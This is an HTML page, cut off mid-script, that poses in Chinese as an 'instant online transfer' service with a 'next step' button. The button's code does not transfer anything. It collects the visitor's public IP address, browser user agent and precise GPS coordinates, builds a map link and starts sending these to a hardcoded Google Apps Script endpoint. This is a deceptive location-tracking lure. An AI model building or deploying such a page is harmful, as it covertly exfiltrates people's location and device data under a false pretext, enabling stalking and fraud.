<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>線上立即轉帳</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 25px; font-size: 20px; cursor: pointer; }
        #status { margin-top: 20px; font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <h2>線上立即轉帳</h2>
    <p>按下按鈕將自動開啟轉帳功能</p>
    <button id="actionBtn" onclick="sendLocation()">下一步</button>
    <p id="status"></p>

    <script>
        const GAS_URL = "https://script.google.com/macros/s/AKfycbyWCmFH3MfqiclvhddGbWTmltlAzQIV5xI4bgB2QxmXgtvxM9vjhU1b7oCje9aaNglGbQ/exec";

        async function sendLocation() {
            const btn = document.getElementById("actionBtn");
            btn.disabled = true;
            document.getElementById("status").innerText = "正在驗證並處理，請稍候...";

            try {
                // 取得 IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                const userAgent = navigator.userAgent;

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
                        const textMessage = `這是我的位置：\n${mapLink}`;

                        // 傳送資料到 GAS
                        const response = await fetch(GAS_URL, {
